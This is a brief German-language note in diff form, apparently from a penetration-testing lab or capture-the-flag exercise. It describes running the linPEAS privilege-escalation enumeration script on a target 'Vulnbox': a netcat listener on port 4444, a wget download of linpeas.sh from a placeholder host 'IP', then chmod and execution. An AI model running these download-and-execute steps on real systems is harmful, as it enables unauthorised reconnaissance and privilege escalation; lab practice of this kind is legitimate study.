@@ -1,0 +1,13 @@
+funktioniert evtl. nur in /tmp zum Herüberziehen, am interessantesten ist rote Schrift mit gelben Hintergrund
+
+https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+
+nc -nvlp 4444
+
+auf Vulnbox:
+wget http://IP:4444/linpeas.sh
+
+chmod +x linpeas.sh
+
+./linpeas.sh
+
